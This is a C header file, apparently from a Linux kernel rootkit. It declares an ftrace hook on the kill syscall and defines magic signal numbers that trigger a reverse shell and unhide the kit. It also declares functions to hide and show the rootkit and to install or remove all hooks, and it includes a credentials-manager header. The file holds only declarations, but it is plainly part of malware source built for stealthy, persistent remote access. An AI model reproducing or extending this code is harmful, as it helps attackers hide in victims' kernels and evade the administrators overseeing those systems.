#ifndef HEADER_HOOKERS
#define HEADER_HOOKERS

#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/signal.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/list.h>
#include <linux/export.h>
#include <linux/dirent.h>

#include "ftrace_manager.h"
#include "creds_manager.h"

// Syscalls to be hooked using frace
#define SIGNAL_KILL_HOOK 50
#define SIGNAL_REVERSE_SHELL 51
#define SIGNAL_UNHIDE_KIT 52

//Hooking kill
asmlinkage int hook_kill(const struct pt_regs *regs);

//Functions for hiding and showing the rootkit
void hide_rootkit(void);
void show_rootkit(void);


void remove_all_hooks(void);
int install_all_hooks(void);

#endif